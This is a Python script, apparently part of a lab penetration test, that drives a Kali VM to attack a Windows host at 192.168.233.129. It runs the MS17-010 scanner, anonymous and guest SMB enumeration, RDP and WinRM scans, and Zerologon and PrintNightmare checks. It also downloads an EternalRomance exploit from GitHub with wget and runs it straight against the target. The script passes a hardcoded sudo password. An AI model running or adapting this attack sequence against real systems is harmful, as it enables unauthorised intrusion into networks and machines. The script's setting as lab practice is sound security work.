#!/usr/bin/env python3
"""Step 7: Fix MSF + alternative attacks (EternalRomance, PsExec, WinRM)"""
import subprocess
import os

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
VMX = r'E:\BaiduNetdiskDownload\kali-linux-2026.1-vmware-amd64.vmwarevm\kali-linux-2026.1-vmware-amd64.vmx'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

def run_kali(cmd, timeout=120):
    script_path = os.path.join(TEMP, 'kali_cmd.sh')
    with open(script_path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(f'#!/bin/bash\n{cmd}\n')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromHostToGuest', VMX,
                    script_path, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'runProgramInGuest', VMX,
                    '/bin/bash', '-c',
                    f'chmod +x /tmp/kali_cmd.sh && timeout {timeout} /tmp/kali_cmd.sh > /tmp/kali_out.txt 2>&1'],
                   capture_output=True, text=True, timeout=timeout + 30)
    out_path = os.path.join(TEMP, 'kali_out.txt')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromGuestToHost', VMX,
                    '/tmp/kali_out.txt', out_path],
                   capture_output=True, text=True, timeout=30)
    try:
        with open(out_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[READ ERROR]"

# 1. Fix MSF bootsnap cache
print("=" * 60)
print("[1] Fix Metasploit bootsnap cache")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S bash -c 'rm -rf /usr/lib/llvm-18/build/Debug+Asserts/build 2>/dev/null; "
    "rm -rf /tmp/bootsnap* 2>/dev/null; "
    "find /usr/share/metasploit-framework -name \".bootsnap\" -exec rm -rf {} + 2>/dev/null; "
    "echo FIXED'",
    timeout=30
)
print(out)

# 2. Try MSF with bootsnap disabled
print("\n" + "=" * 60)
print("[2] MSF with bootsnap disabled - MS17-010 scanner")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S DISABLE_BOOTSNAP=1 msfconsole -q --no-defconfig -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.233.129; run; exit' 2>&1 | tail -30",
    timeout=180
)
print(out)

# 3. Try crackmapexec with --shares (no auth)
print("\n" + "=" * 60)
print("[3] CrackMapExec --shares (no auth)")
print("=" * 60)
out = run_kali(
    "crackmapexec smb 192.168.233.129 --shares '' 2>&1 && "
    "echo '---' && "
    "crackmapexec smb 192.168.233.129 -u '' -p '' --shares 2>&1 && "
    "echo '---' && "
    "crackmapexec smb 192.168.233.129 -u 'guest' -p '' --shares 2>&1",
    timeout=30
)
print(out)

# 4. Try NetExec (nxc)
print("\n" + "=" * 60)
print("[4] NetExec enumeration")
print("=" * 60)
out = run_kali(
    "nxc smb 192.168.233.129 2>&1 || netexec smb 192.168.233.129 2>&1",
    timeout=30
)
print(out)

# 5. Try impacket-smbclient with guest
print("\n" + "=" * 60)
print("[5] Impacket SMB client (guest access)")
print("=" * 60)
out = run_kali(
    "impacket-smbclient 'guest:@192.168.233.129' -no-pass 2>&1 || "
    "echo 'guest failed' && "
    "impacket-smbclient ':@192.168.233.129' -no-pass 2>&1 || "
    "echo 'anonymous failed'",
    timeout=30
)
print(out)

# 6. Check for WinRM (5985/5986)
print("\n" + "=" * 60)
print("[6] WinRM check + crackmapexec winrm")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S nmap -p 5985,5986 192.168.233.129 2>&1",
    timeout=30
)
print(out)

# 7. Check for RDP (3389)
print("\n" + "=" * 60)
print("[7] RDP check + BlueKeep")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S nmap -p 3389 --script rdp-vuln-ms12-020,rdp-enum-encryption 192.168.233.129 2>&1",
    timeout=30
)
print(out)

# 8. Try EternalRomance via Python directly (doesn't need MS17-010)
print("\n" + "=" * 60)
print("[8] EternalRomance Python exploit (CVE-2017-0145)")
print("=" * 60)
out = run_kali(
    "cd /tmp && "
    "wget -q https://raw.githubusercontent.com/worawit/MS17-010/master/eternalromance.py 2>&1 && "
    "python3 eternalromance.py 192.168.233.129 2>&1 | head -20 || "
    "echo 'Download failed'",
    timeout=60
)
print(out)

# 9. Try Zerologon (CVE-2020-1472) - works on domain controllers
print("\n" + "=" * 60)
print("[9] Zerologon check (CVE-2020-1472)")
print("=" * 60)
out = run_kali(
    "crackmapexec smb 192.168.233.129 -u '' -p '' -M zerologon 2>&1 || "
    "echo 'Not a domain controller'",
    timeout=30
)
print(out)

# 10. Check for PrintNightmare
print("\n" + "=" * 60)
print("[10] PrintNightmare (CVE-2021-1675) check")
print("=" * 60)
out = run_kali(
    "crackmapexec smb 192.168.233.129 -u '' -p '' -M printnightmare 2>&1 || "
    "echo 'PrintNightmare module not available'",
    timeout=30
)
print(out)

# 11. Full enumeration with nmap scripts
print("\n" + "=" * 60)
print("[11] Nmap SMB enumeration scripts")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-mbenum,smb2-capabilities 192.168.233.129 2>&1",
    timeout=60
)
print(out)

print("\n" + "=" * 60)
print("ALTERNATIVE ATTACKS COMPLETE")
print("=" * 60)
